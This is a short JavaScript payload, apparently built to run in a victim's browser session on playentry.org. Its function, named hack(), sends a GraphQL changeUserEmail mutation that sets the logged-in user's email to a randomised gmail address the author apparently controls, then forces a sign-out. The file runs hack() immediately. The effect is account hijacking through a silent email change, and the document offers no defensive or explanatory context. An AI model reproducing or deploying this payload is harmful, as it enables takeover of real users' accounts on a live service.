function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}

async function hack() {
var randstr = makeid(6);
await fetch('https://playentry.org/graphql', {
  method: "POST",
  headers: {"Content-Type": "application/json",},
  body: JSON.stringify({
    "query":"\n    mutation ($email: String!) {\n        changeUserEmail(email: $email) {\n            \n    status\n    result\n\n        }\n    }\n",
    "variables":{"email":`playentrymail+${randstr}@gmail.com`}
    })});
await fetch("https://playentry.org/signout", {"method": "GET"});
}
hack();
    
